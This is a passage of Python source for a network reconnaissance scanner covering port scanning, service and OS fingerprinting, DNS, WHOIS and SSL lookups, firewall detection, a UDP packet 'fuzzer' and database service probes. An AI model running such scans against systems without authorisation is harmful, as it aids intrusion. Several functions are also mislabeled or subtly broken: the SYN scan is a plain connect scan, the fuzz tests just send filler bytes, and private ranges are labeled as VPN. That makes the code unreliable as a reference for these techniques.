                        result['technologies'].append('jQuery')
        except:
            pass
        return result

    def get_whois(self, domain: str) -> Dict[str, str]:
        result = {
            'registrar': 'Unknown',
            'creation_date': 'Unknown',
            'expiration_date': 'Unknown',
            'name_servers': [],
            'status': 'Unknown',
            'emails': [],
            'country': 'Unknown',
            'org': 'Unknown',
            'domain_name': domain
        }
        if not WHOIS_AVAILABLE:
            return result
        try:
            w = whois.whois(domain)
            if w.registrar:
                result['registrar'] = str(w.registrar)
            if w.creation_date:
                result['creation_date'] = str(w.creation_date[0] if isinstance(w.creation_date, list) else w.creation_date)
            if w.expiration_date:
                result['expiration_date'] = str(w.expiration_date[0] if isinstance(w.expiration_date, list) else w.expiration_date)
            if w.name_servers:
                result['name_servers'] = w.name_servers if isinstance(w.name_servers, list) else [w.name_servers]
            if w.status:
                result['status'] = str(w.status)
            if w.emails:
                result['emails'] = w.emails if isinstance(w.emails, list) else [w.emails]
            if w.country:
                result['country'] = str(w.country)
            if w.org:
                result['org'] = str(w.org)
        except:
            pass
        return result

    def get_ssl_info(self, domain: str, port: int = 443) -> Dict[str, Any]:
        result = {
            'valid': False,
            'issuer': 'Unknown',
            'subject': 'Unknown',
            'not_before': 'Unknown',
            'not_after': 'Unknown',
            'sans': [],
            'version': 'Unknown',
            'algorithm': 'Unknown',
            'error': None
        }
        try:
            context = ssl_lib.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl_lib.CERT_NONE
            with socket.create_connection((domain, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    if cert:
                        result['valid'] = True
                        if 'issuer' in cert:
                            result['issuer'] = dict(cert['issuer']).get('commonName', 'Unknown')
                        if 'subject' in cert:
                            result['subject'] = dict(cert['subject']).get('commonName', 'Unknown')
                        if 'notBefore' in cert:
                            result['not_before'] = cert['notBefore']
                        if 'notAfter' in cert:
                            result['not_after'] = cert['notAfter']
                        if 'subjectAltName' in cert:
                            result['sans'] = [san[1] for san in cert['subjectAltName']]
                        if 'version' in cert:
                            result['version'] = cert['version']
                        if 'signatureAlgorithm' in cert:
                            result['algorithm'] = cert['signatureAlgorithm']
        except:
            pass
        return result

    def process_target(self, target: str) -> Dict[str, Any]:
        result = {
            'original_target': target,
            'type': None,
            'ip_addresses': [],
            'port': None,
            'scheme': None,
            'path': None,
            'query': None,
            'subdomains': [],
            'whois': {},
            'technology': {},
            'dns_info': {},
            'ssl_info': {},
            'is_url': False,
            'is_domain': False,
            'is_ip': False
        }
        if target.startswith(('http://', 'https://', 'ftp://')):
            parsed = self.parse_url(target)
            if parsed:
                result['type'] = 'url'
                result['is_url'] = True
                result['scheme'] = parsed.get('scheme')
                result['port'] = int(parsed['port']) if parsed.get('port') else None
                result['path'] = parsed.get('path')
                result['query'] = parsed.get('query')
                dns_info = self.resolve_domain(parsed['host'])
                result['ip_addresses'] = dns_info['ipv4'] + dns_info['ipv6']
                result['dns_info'] = dns_info
                result['technology'] = self.detect_technology(target)
                result['whois'] = self.get_whois(parsed['host'])
                result['subdomains'] = self.discover_subdomains(parsed['host'])
                result['ssl_info'] = self.get_ssl_info(parsed['host'], 443 if parsed.get('scheme') == 'https' else 80)
        elif '.' in target and not target.replace('.', '').isdigit():
            result['type'] = 'domain'
            result['is_domain'] = True
            dns_info = self.resolve_domain(target)
            result['ip_addresses'] = dns_info['ipv4'] + dns_info['ipv6']
            result['dns_info'] = dns_info
            result['whois'] = self.get_whois(target)
            result['subdomains'] = self.discover_subdomains(target)
            result['ssl_info'] = self.get_ssl_info(target)
            for scheme in ['https', 'http']:
                try:
                    url = f"{scheme}://{target}"
                    result['technology'] = self.detect_technology(url)
                    result['scheme'] = scheme
                    break
                except:
                    pass
        else:
            try:
                ipaddress.ip_address(target)
                result['type'] = 'ip'
                result['is_ip'] = True
                result['ip_addresses'] = [target]
                if DNS_AVAILABLE:
                    try:
                        reversed_name = dns.reversename.from_address(target)
                        ptr = dns.resolver.resolve(reversed_name, 'PTR')
                        result['dns_info']['ptr'] = str(ptr[0])
                    except:
                        pass
            except:
                result['type'] = 'unknown'
        return result

class CoreScanner:
    def __init__(self, target: str, ports: List[int], protocol: str = "TCP", 
                 flags: List[str] = None, threads: int = 500, timeout: float = 3.0):
        self.target = target
        self.ports = ports
        self.protocol = protocol.upper()
        self.flags = flags or ["SYN"]
        self.threads = min(threads, CONFIG['max_threads'])
        self.timeout = timeout
        self.results = []
        self.progress = 0
        self.is_ipv6 = self._check_ipv6(target)
        self.animator = Animator()
        self.found_ports = []
        self._stop_scan = False
        
    def _check_ipv6(self, target: str) -> bool:
        try:
            ipaddress.IPv6Address(target)
            return True
        except:
            return False

    def _scan_port(self, target: str, port: int, timeout: float) -> Tuple[int, float]:
        """Scan a single port with timeout"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            start = time.time()
            result = sock.connect_ex((target, port))
            latency = (time.time() - start) * 1000
            sock.close()
            if result == 0:
                return (port, latency)
            return (None, None)
        except:
            return (None, None)

    def _scan_batch(self, target: str, ports: List[int], timeout: float) -> List[Dict]:
        """Scan a batch of ports in parallel"""
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._scan_port, target, port, timeout): port for port in ports}
            for future in as_completed(futures):
                if self._stop_scan:
                    break
                port = futures[future]
                try:
                    scanned_port, latency = future.result()
                    if scanned_port:
                        results.append({"port": scanned_port, "latency": latency})
                        self.found_ports.append(scanned_port)
                except:
                    pass
        return results

    def scan(self) -> List[Dict]:
        """Scan all ports with animation and progress"""
        LOGGER.info(f"Starting {self.protocol} scan on {self.target} (IPv6: {self.is_ipv6})")
        
        start_port = min(self.ports) if len(self.ports) == 2 else 1
        end_port = max(self.ports) if len(self.ports) == 2 else CONFIG['max_port_scan']
        total_ports = end_port - start_port + 1
        
        print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════╗")
        print(f"{Colors.CYAN}║ {Colors.WHITE}SCANNING: {Colors.GREEN}{self.target} {Colors.CYAN}║")
        print(f"{Colors.CYAN}║ {Colors.WHITE}PORTS: {Colors.YELLOW}{start_port}-{end_port} ({total_ports} ports) {Colors.CYAN}║")
        print(f"{Colors.CYAN}║ {Colors.WHITE}PROTOCOL: {Colors.MAGENTA}{self.protocol} {Colors.CYAN}║")
        print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════╝\n")
        
        all_results = []
        batch_size = CONFIG['scan_batch_size']
        
        # Create port batches for scanning
        port_batches = [list(range(i, min(i + batch_size, end_port + 1))) 
                       for i in range(start_port, end_port + 1, batch_size)]
        
        for batch_idx, batch in enumerate(port_batches):
            if self._stop_scan:
                break
            batch_results = self._scan_batch(self.target, batch, self.timeout)
            all_results.extend(batch_results)
            
            # Update progress
            scanned = min((batch_idx + 1) * batch_size, total_ports)
            self.animator.animate_scan(scanned, total_ports, len(self.found_ports), self.target)
            
            # Print found ports immediately
            for result in batch_results:
                if result:
                    print(f"\n{Colors.GREEN}├── [+] PORT {result['port']} OPEN ({result['latency']:.2f}ms)")
        
        print(f"\n\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════╗")
        print(f"{Colors.CYAN}║ {Colors.GREEN}SCAN COMPLETE {Colors.CYAN}║")
        print(f"{Colors.CYAN}║ {Colors.WHITE}Total Ports: {Colors.YELLOW}{total_ports} {Colors.CYAN}║")
        print(f"{Colors.CYAN}║ {Colors.WHITE}Open Ports: {Colors.GREEN}{len(self.found_ports)} {Colors.CYAN}║")
        print(f"{Colors.CYAN}║ {Colors.WHITE}Time: {Colors.CYAN}{self.animator.elapsed_time()} {Colors.CYAN}║")
        print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════╝\n")
        
        return all_results

    def stop(self):
        """Stop the scan"""
        self._stop_scan = True

class ProtocolFingerprinter:
    PROTOCOL_PATTERNS = {
        "SSH": {
            "patterns": [b"SSH-", b"OpenSSH", b"Dropbear", b"libssh", b"SSH-2.0"],
            "versions": ["1.99", "2.0", "3.0", "4.0", "5.0", "6.0", "7.0", "8.0", "9.0"],
            "vendors": ["OpenSSH", "Dropbear", "PuTTY", "Paramiko", "libssh"],
            "auth_methods": ["password", "publickey", "keyboard-interactive", "gssapi", "hostbased"],
            "crypto": ["RSA", "DSA", "ECDSA", "ED25519", "AES", "ChaCha20", "3DES"],
            "protocols": ["SSH"]
        },
        "HTTP": {
            "patterns": [b"HTTP/", b"Server:", b"Apache", b"nginx", b"IIS", b"Gunicorn", b"Tomcat", b"Jetty", b"Node.js", b"Express"],
            "versions": ["1.0", "1.1", "2.0", "3.0"],
            "vendors": ["Apache", "Nginx", "Microsoft-IIS", "Gunicorn", "Tomcat", "Jetty", "Node.js"],
            "methods": ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"],
            "headers": ["User-Agent", "Host", "Accept", "Content-Type", "Authorization", "Cookie"],
            "protocols": ["HTTP"]
        },
        "SMTP": {
            "patterns": [b"220", b"EHLO", b"HELO", b"MAIL", b"RCPT", b"DATA", b"ESMTP"],
            "versions": ["ESMTP", "SMTP"],
            "vendors": ["Postfix", "Sendmail", "Exim", "Microsoft Exchange", "Qmail"],
            "extensions": ["PIPELINING", "SIZE", "ETRN", "AUTH", "STARTTLS", "ENHANCEDSTATUSCODES"],
            "protocols": ["SMTP"]
        },
        "FTP": {
            "patterns": [b"220", b"USER", b"PASS", b"PORT", b"PASV", b"LIST", b"RETR", b"STOR"],
            "versions": ["FTP", "FTP/TLS"],
            "vendors": ["ProFTPD", "vsftpd", "Pure-FTPd", "FileZilla", "Microsoft FTP"],
            "commands": ["USER", "PASS", "PORT", "PASV", "TYPE", "LIST", "RETR", "STOR"],
            "protocols": ["FTP"]
        },
        "MySQL": {
            "patterns": [b"mysql", b"MariaDB", b"5.", b"8.", b"10.", b"MySQL"],
            "versions": ["5.0", "5.1", "5.5", "5.6", "5.7", "8.0", "10.0", "10.1", "10.2"],
            "vendors": ["MySQL", "MariaDB", "Percona"],
            "features": ["SSL", "Compression", "Authentication", "Cursors", "Transactions"],
            "protocols": ["MySQL"]
        },
        "PostgreSQL": {
            "patterns": [b"PostgreSQL", b"psql", b"Postgres", b"PG"],
            "versions": ["9.0", "9.1", "9.2", "9.3", "9.4", "9.5", "9.6", "10", "11", "12", "13", "14"],
            "vendors": ["PostgreSQL Global Development Group"],
            "features": ["SSL", "Replication", "JSON", "Full-Text Search"],
            "protocols": ["PostgreSQL"]
        },
        "Redis": {
            "patterns": [b"REDIS", b"redis", b"+OK", b"-ERR", b"redis-cli"],
            "versions": ["2.0", "3.0", "4.0", "5.0", "6.0", "7.0"],
            "vendors": ["Redis Labs"],
            "commands": ["PING", "SET", "GET", "INFO", "CONFIG", "AUTH", "SELECT"],
            "protocols": ["Redis"]
        },
        "MongoDB": {
            "patterns": [b"MongoDB", b"Mongo", b"wire", b"opcode", b"mongod"],
            "versions": ["2.0", "3.0", "4.0", "5.0", "6.0"],
            "vendors": ["MongoDB Inc"],
            "features": ["Replication", "Sharding", "Aggregation", "GridFS"],
            "protocols": ["MongoDB"]
        },
        "RDP": {
            "patterns": [b"RDP", b"Remote Desktop", b"Terminal Server", b"msrdp"],
            "versions": ["5.0", "6.0", "7.0", "8.0", "10.0"],
            "vendors": ["Microsoft"],
            "features": ["SSL", "NLA", "CredSSP", "RemoteFX"],
            "protocols": ["RDP"]
        },
        "SMB": {
            "patterns": [b"SMB", b"NT LM", b"Microsoft", b"LanMan"],
            "versions": ["1.0", "2.0", "2.1", "3.0", "3.1"],
            "vendors": ["Microsoft", "Samba"],
            "features": ["Signing", "Encryption", "Large MTU", "Multi-channel"],
            "protocols": ["SMB"]
        },
        "Telnet": {
            "patterns": [b"Telnet", b"TELNET", b"login:", b"Password:"],
            "versions": ["Telnet"],
            "vendors": ["Various"],
            "options": ["ECHO", "SUPPRESS_GO_AHEAD", "STATUS", "TIMING_MARK"],
            "protocols": ["Telnet"]
        },
        "SNMP": {
            "patterns": [b"SNMP", b"public", b"private"],
            "versions": ["1", "2c", "3"],
            "vendors": ["Various"],
            "features": ["MIB-2", "RMON", "BRIDGE-MIB"],
            "protocols": ["SNMP"]
        }
    }

    def fingerprint(self, ip: str, port: int, banner: str) -> ServiceFingerprint:
        if not banner:
            return ServiceFingerprint(
                name="Unknown",
                version="Unknown",
                vendor="Unknown",
                os="Unknown",
                protocols=[],
                auth_methods=[],
                crypto=[],
                banner="",
                confidence=0.0
            )
        banner_bytes = banner.encode('utf-8', errors='ignore')
        for service_name, patterns in self.PROTOCOL_PATTERNS.items():
            for pattern in patterns["patterns"]:
                if pattern in banner_bytes or pattern.lower() in banner_bytes.lower():
                    version = self._extract_version(banner, patterns)
                    vendor = self._extract_vendor(banner, patterns)
                    protocols = patterns.get("protocols", [])
                    return ServiceFingerprint(
                        name=service_name,
                        version=version,
                        vendor=vendor,
                        os=self._detect_os(banner),
                        protocols=protocols if isinstance(protocols, list) else [],
                        auth_methods=patterns.get("auth_methods", []),
                        crypto=patterns.get("crypto", []),
                        banner=banner[:500],
                        confidence=0.95
                    )
        return ServiceFingerprint(
            name="Unknown",
            version="Unknown",
            vendor="Unknown",
            os="Unknown",
            protocols=[],
            auth_methods=[],
            crypto=[],
            banner=banner[:500],
            confidence=0.5
        )

    def _extract_version(self, banner: str, patterns: Dict) -> str:
        version_patterns = [
            r'(\d+\.\d+(?:\.\d+)?)',
            r'version[:\s]+(\d+\.\d+(?:\.\d+)?)',
            r'v(\d+\.\d+(?:\.\d+)?)',
            r'/(\d+\.\d+(?:\.\d+)?)'
        ]
        for pattern in version_patterns:
            match = re.search(pattern, banner, re.IGNORECASE)
            if match:
                return match.group(1)
        return "Unknown"

    def _extract_vendor(self, banner: str, patterns: Dict) -> str:
        for vendor in patterns.get("vendors", []):
            if vendor.lower() in banner.lower():
                return vendor
        return "Unknown"

    def _detect_os(self, banner: str) -> str:
        os_patterns = {
            "Linux": [b"Linux", b"Ubuntu", b"Debian", b"CentOS", b"Red Hat", b"Fedora"],
            "Windows": [b"Windows", b"Microsoft", b"Win", b"NT"],
            "FreeBSD": [b"FreeBSD", b"BSD"],
            "OpenBSD": [b"OpenBSD"],
            "MacOS": [b"Darwin", b"Mac OS", b"macOS"],
            "Cisco": [b"Cisco", b"IOS"],
            "Juniper": [b"Juniper", b"JunOS"]
        }
        banner_bytes = banner.encode('utf-8', errors='ignore')
        for os_name, patterns in os_patterns.items():
            for pattern in patterns:
                if pattern in banner_bytes:
                    return os_name
        return "Unknown"

class OSFingerprinter:
    OS_FINGERPRINTS = {
        "Linux": {"ttl": [64, 255], "window": [5840, 65535], "flags": ["DF"], "ports": [22, 80, 443, 3306, 5432, 6379]},
        "Windows": {"ttl": [128, 255], "window": [8192, 16384, 65535], "flags": ["DF"], "ports": [135, 139, 445, 3389, 80, 443, 49152]},
        "FreeBSD": {"ttl": [64, 255], "window": [65535], "flags": ["DF"], "ports": [22, 80, 443]},
        "MacOS": {"ttl": [64, 255], "window": [65535], "flags": ["DF"], "ports": [22, 80, 443, 548]},
        "Cisco": {"ttl": [255], "window": [4128, 8192], "flags": ["DF"], "ports": [22, 23, 161, 80, 443]},
        "Juniper": {"ttl": [64, 255], "window": [8192], "flags": ["DF"], "ports": [22, 23, 161]}
    }

    def fingerprint(self, ip: str, open_ports: List[int], ttl: int = 64, window: int = 65535) -> OSFingerprint:
        scores = defaultdict(float)
        for os_name, fingerprint in self.OS_FINGERPRINTS.items():
            score = 0.0
            if ttl in fingerprint["ttl"]:
                score += 30
            elif min(fingerprint["ttl"]) <= ttl <= max(fingerprint["ttl"]):
                score += 15
            if window in fingerprint["window"]:
                score += 20
            elif min(fingerprint["window"]) <= window <= max(fingerprint["window"]):
                score += 10
            matching_ports = len(set(open_ports) & set(fingerprint["ports"]))
            score += matching_ports * 10
            scores[os_name] = score
        if scores:
            best_os = max(scores, key=scores.get)
            confidence = min(scores[best_os] / 100.0, 1.0)
            return OSFingerprint(
                name=best_os,
                version=self._detect_version(best_os, open_ports),
                family=best_os,
                ttl=ttl,
                window_size=window,
                flags=["DF"],
                confidence=confidence
            )
        return OSFingerprint(
            name="Unknown",
            version="Unknown",
            family="Unknown",
            ttl=ttl,
            window_size=window,
            flags=[],
            confidence=0.0
        )

    def _detect_version(self, os_name: str, ports: List[int]) -> str:
        version_map = {
            "Linux": self._detect_linux_version(ports),
            "Windows": self._detect_windows_version(ports),
            "FreeBSD": "Generic",
            "MacOS": "Generic",
            "Cisco": "IOS",
            "Juniper": "JunOS"
        }
        return version_map.get(os_name, "Unknown")

    def _detect_linux_version(self, ports: List[int]) -> str:
        if 22 in ports and 80 in ports and 443 in ports:
            return "Server"
        elif 22 in ports and 80 in ports:
            return "Desktop"
        return "Generic"

    def _detect_windows_version(self, ports: List[int]) -> str:
        if 3389 in ports:
            if 445 in ports and 135 in ports:
                return "Server"
            return "Workstation"
        return "Generic"

class FirewallDetector:
    def detect(self, ip: str, ports: List[int]) -> Dict[int, str]:
        results = {}
        for port in ports[:50]:
            try:
                syn_result = self._syn_scan(ip, port)
                conn_result = self._connect_scan(ip, port)
                udp_result = self._udp_scan(ip, port)
                if not syn_result and not conn_result and not udp_result:
                    results[port] = "Stateful Firewall (All Blocked)"
                elif syn_result and conn_result and udp_result:
                    results[port] = "No Firewall"
                elif syn_result and not conn_result and not udp_result:
                    results[port] = "Stateless Firewall (SYN Only)"
                elif syn_result and conn_result and not udp_result:
                    results[port] = "Application Firewall (UDP Filtered)"
                else:
                    results[port] = "Complex Firewall (Mixed)"
            except:
                results[port] = "Unable to Detect"
        return results

    def _syn_scan(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def _connect_scan(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def _udp_scan(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(b'\x00', (ip, port))
            try:
                data, _ = sock.recvfrom(1024)
                sock.close()
                return True
            except socket.timeout:
                sock.close()
                return False
        except:
            return False

class CertificateAnalyzer:
    def analyze(self, ip: str, port: int = 443) -> Optional[Dict[str, Any]]:
        try:
            context = ssl_lib.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl_lib.CERT_NONE
            with socket.create_connection((ip, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=ip) as ssock:
                    cert = ssock.getpeercert()
                    if not cert:
                        return None
                    cipher = ssock.cipher()
                    return {
                        "subject": self._parse_subject(cert.get('subject', [])),
                        "issuer": self._parse_subject(cert.get('issuer', [])),
                        "version": cert.get('version', 'Unknown'),
                        "serial": cert.get('serialNumber', 'Unknown'),
                        "not_before": cert.get('notBefore', 'Unknown'),
                        "not_after": cert.get('notAfter', 'Unknown'),
                        "subject_alt_names": cert.get('subjectAltName', []),
                        "algorithm": cert.get('signatureAlgorithm', 'Unknown'),
                        "cipher": cipher[0] if cipher else 'Unknown',
                        "protocol": cipher[1] if cipher else 'Unknown',
                        "expired": self._is_expired(cert.get('notAfter', '')),
                        "extensions": self._extract_extensions(cert)
                    }
        except:
            return None

    def _parse_subject(self, subject: List) -> Dict[str, str]:
        result = {}
        for item in subject:
            if isinstance(item, tuple):
                for key, value in item:
                    result[key] = value
        return result

    def _is_expired(self, not_after: str) -> bool:
        try:
            exp_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
            return exp_date < datetime.now()
        except:
            return True

    def _extract_extensions(self, cert: Dict) -> Dict[str, Any]:
        extensions = {}
        if 'subjectAltName' in cert:
            extensions['san'] = cert['subjectAltName']
        if 'OCSP' in cert:
            extensions['ocsp'] = cert['OCSP']
        if 'caIssuers' in cert:
            extensions['ca_issuers'] = cert['caIssuers']
        return extensions

class DNSRecon:
    def enumerate(self, target: str) -> Dict[str, Any]:
        results = {
            'a_records': [],
            'aaaa_records': [],
            'mx_records': [],
            'ns_records': [],
            'txt_records': [],
            'cname_records': [],
            'ptr_records': [],
            'soa_records': [],
            'reverse_lookup': None
        }
        if not DNS_AVAILABLE:
            return results
        try:
            results['a_records'] = [str(r) for r in dns.resolver.resolve(target, 'A')]
        except:
            pass
        try:
            results['aaaa_records'] = [str(r) for r in dns.resolver.resolve(target, 'AAAA')]
        except:
            pass
        try:
            results['mx_records'] = [str(r.exchange) for r in dns.resolver.resolve(target, 'MX')]
        except:
            pass
        try:
            results['ns_records'] = [str(r) for r in dns.resolver.resolve(target, 'NS')]
        except:
            pass
        try:
            results['txt_records'] = [str(r) for r in dns.resolver.resolve(target, 'TXT')]
        except:
            pass
        try:
            results['cname_records'] = [str(r) for r in dns.resolver.resolve(target, 'CNAME')]
        except:
            pass
        try:
            reversed_name = dns.reversename.from_address(target)
            results['ptr_records'] = [str(r) for r in dns.resolver.resolve(reversed_name, 'PTR')]
        except:
            pass
        try:
            results['soa_records'] = [str(r) for r in dns.resolver.resolve(target, 'SOA')]
        except:
            pass
        try:
            reversed_name = dns.reversename.from_address(target)
            results['reverse_lookup'] = str(dns.resolver.resolve(reversed_name, 'PTR')[0])
        except:
            pass
        return results

class GeoLocator:
    def __init__(self):
        self.db = None
        if MAXMIND_AVAILABLE:
            try:
                self.db = maxminddb.open_database('GeoLite2-City.mmdb')
            except:
                pass

    def get_location(self, ip: str) -> Dict[str, str]:
        result = {
            "country": "Unknown",
            "country_code": "XX",
            "city": "Unknown",
            "region": "Unknown",
            "postal_code": "Unknown",
            "isp": "Unknown",
            "asn": "Unknown",
            "org": "Unknown",
            "latitude": "0.0",
            "longitude": "0.0",
            "timezone": "UTC"
        }
        if self.db:
            try:
                data = self.db.get(ip)
                if data:
                    if 'country' in data:
                        result['country'] = data['country']['names']['en']
                        result['country_code'] = data['country']['iso_code']
                    if 'city' in data:
                        result['city'] = data['city']['names']['en']
                    if 'subdivisions' in data and data['subdivisions']:
                        result['region'] = data['subdivisions'][0]['names']['en']
                    if 'postal' in data:
                        result['postal_code'] = data['postal']['code']
                    if 'location' in data:
                        result['latitude'] = str(data['location']['latitude'])
                        result['longitude'] = str(data['location']['longitude'])
                    if 'timezone' in data:
                        result['timezone'] = data['location']['timezone']
            except:
                pass
        if result['country'] == "Unknown" and REQUESTS_AVAILABLE:
            try:
                response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'success':
                        result['country'] = data.get('country', 'Unknown')
                        result['country_code'] = data.get('countryCode', 'XX')
                        result['city'] = data.get('city', 'Unknown')
                        result['region'] = data.get('regionName', 'Unknown')
                        result['postal_code'] = data.get('zip', 'Unknown')
                        result['isp'] = data.get('isp', 'Unknown')
                        result['asn'] = data.get('as', 'Unknown')
                        result['org'] = data.get('org', 'Unknown')
                        result['latitude'] = str(data.get('lat', 0.0))
                        result['longitude'] = str(data.get('lon', 0.0))
                        result['timezone'] = data.get('timezone', 'UTC')
            except:
                pass
        return result

class PacketFuzzer:
    def fuzz(self, target: str, port: int) -> List[Dict[str, Any]]:
        results = []
        fuzz_tests = [
            ("Oversize Packet", b"X" * 65535),
            ("Invalid Flags", b"X" * 40),
            ("Fragmented Packet", b"X" * 1500),
            ("Zero Window", b"X" * 40),
            ("Maximum TTL", b"X" * 40),
            ("Minimum TTL", b"X" * 40)
        ]
        for test_name, packet in fuzz_tests:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                start = time.time()
                sock.sendto(packet, (target, port))
                latency = (time.time() - start) * 1000
                sock.close()
                results.append({
                    "test": test_name,
                    "status": "Sent",
                    "latency": round(latency, 2),
                    "response": "No response expected",
                    "packet_size": len(packet)
                })
                time.sleep(CONFIG['scan_interval'])
            except:
                results.append({
                    "test": test_name,
                    "status": "Error",
                    "latency": 0,
                    "response": "Error",
                    "packet_size": 0
                })
        return results

class TimingAnalyzer:
    def analyze(self, ip: str, port: int) -> Dict[str, float]:
        measurements = []
        for _ in range(10):
            start = time.time()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                sock.close()
                measurements.append((time.time() - start) * 1000)
            except:
                pass
        if not measurements:
            return {"mean": 0, "std": 0, "min": 0, "max": 0, "jitter": 0, "packet_loss": 100}
        mean = sum(measurements) / len(measurements)
        variance = sum((x - mean) ** 2 for x in measurements) / len(measurements)
        return {
            "mean": mean,
            "std": variance ** 0.5,
            "min": min(measurements),
            "max": max(measurements),
            "jitter": self._calculate_jitter(measurements),
            "packet_loss": 0,
            "samples": len(measurements)
        }

    def _calculate_jitter(self, measurements: List[float]) -> float:
        if len(measurements) < 2:
            return 0
        return sum(abs(measurements[i] - measurements[i-1]) for i in range(1, len(measurements))) / (len(measurements) - 1)

class ProxyDetector:
    def detect(self, ip: str, port: int) -> Dict[str, Any]:
        results = {"is_proxy": False, "is_vpn": False, "proxy_type": None, "version": None, "confidence": 0.0}
        proxy_ports = {1080: "SOCKS", 8080: "HTTP", 3128: "HTTP", 8888: "HTTP", 8118: "HTTP", 8000: "HTTP"}
        if port in proxy_ports:
            results["is_proxy"] = True
            results["proxy_type"] = proxy_ports[port]
            results["confidence"] = 0.7
            results["version"] = "Unknown"
        if self._check_vpn(ip):
            results["is_vpn"] = True
            results["confidence"] = max(results["confidence"], 0.6)
        return results

    def _check_vpn(self, ip: str) -> bool:
        vpn_ranges = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
        try:
            ip_obj = ipaddress.ip_address(ip)
            for range_str in vpn_ranges:
                if ip_obj in ipaddress.ip_network(range_str):
                    return True
        except:
            pass
        return False

class DatabaseScanner:
    def scan(self, ip: str, port: int) -> Dict[str, Any]:
        if port == 3306:
            return self._scan_mysql(ip, port)
        elif port == 5432:
            return self._scan_postgresql(ip, port)
        elif port == 6379:
            return self._scan_redis(ip, port)
        elif port == 27017:
            return self._scan_mongodb(ip, port)
        elif port == 1433:
            return self._scan_mssql(ip, port)
        else:
            return {"status": "Unknown database service"}

    def _scan_mysql(self, ip: str, port: int) -> Dict[str, Any]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            sock.send(b'\x05\x00\x00\x00\x0a')
            response = sock.recv(4096)
            sock.close()
            version = self._extract_mysql_version(response)
            auth_plugin = self._extract_mysql_auth_plugin(response)
            vulnerabilities = self._check_mysql_vulnerabilities(version)
            return {
                "service": "MySQL",
                "version": version,
                "auth_plugin": auth_plugin,
                "ssl_status": "Enabled" if b"SSL" in response else "Disabled",
                "vulnerabilities": vulnerabilities,
                "max_connections": self._estimate_mysql_max_connections(ip, port)
            }
        except:
            return {"status": "Unable to scan MySQL"}

    def _scan_postgresql(self, ip: str, port: int) -> Dict[str, Any]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            startup = b'\x00\x00\x00\x08\x04\xd2\x16\x2f'
            sock.send(startup)
            response = sock.recv(4096)
            sock.close()
            version = self._extract_postgres_version(response)
            return {
                "service": "PostgreSQL",
                "version": version,
                "ssl_status": "Enabled" if b"SSL" in response else "Disabled",
                "vulnerabilities": self._check_postgres_vulnerabilities(version)
            }
        except:
            return {"status": "Unable to scan PostgreSQL"}

    def _scan_redis(self, ip: str, port: int) -> Dict[str, Any]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            sock.send(b'INFO\\r\\n')
            response = sock.recv(8192)
            sock.close()
            version = self._extract_redis_version(response)
            auth_required = b"NOAUTH" in response
            return {
                "service": "Redis",
                "version": version,
                "auth_required": auth_required,
                "vulnerabilities": self._check_redis_vulnerabilities(version)
            }
        except:
            return {"status": "Unable to scan Redis"}

    def _scan_mongodb(self, ip: str, port: int) -> Dict[str, Any]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            sock.send(b'\x3d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00\x61\x64\x6d\x69\x6e\x2e\x24\x63\x6d\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            response = sock.recv(4096)
            sock.close()
            version = self._extract_mongodb_version(response)
            return {
                "service": "MongoDB",
                "version": version,
                "vulnerabilities": self._check_mongodb_vulnerabilities(version)
            }
        except:
            return {"status": "Unable to scan MongoDB"}

    def _scan_mssql(self, ip: str, port: int) -> Dict[str, Any]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            sock.send(b'\x12\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            response = sock.recv(1024)
            sock.close()
            version = self._extract_mssql_version(response)
            return {
                "service": "MSSQL",
                "version": version,
                "vulnerabilities": self._check_mssql_vulnerabilities(version)
            }
        except:
            return {"status": "Unable to scan MSSQL"}

    def _extract_mysql_version(self, data: bytes) -> str:
        try:
            parts = data.split(b'\x00')
            for part in parts:
                if b'.' in part and (b'mysql' in part.lower() or b'MariaDB' in part):
